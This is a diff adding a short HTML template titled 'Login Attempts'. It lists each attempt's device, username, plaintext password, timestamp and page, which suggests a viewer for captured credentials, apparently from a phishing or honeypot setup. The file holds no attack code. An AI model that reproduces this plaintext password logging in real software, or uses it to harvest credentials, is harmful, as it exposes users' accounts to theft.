@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Attempts</title>
+</head>
+<body>
+    <h1>Login Attempts</h1>
+    <table border="1">
+        <thead>
+            <tr>
+                <th>Device</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Date & Time</th>
+                <th>Page</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for attempt in login_attempts %}
+            <tr>
+                <td>{{ attempt.device }}</td>
+                <td>{{ attempt.username }}</td>
+                <td>{{ attempt.password }}</td>
+                <td>{{ attempt.date_time }}</td>
+                <td>{{ attempt.page }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</body>
+</html>
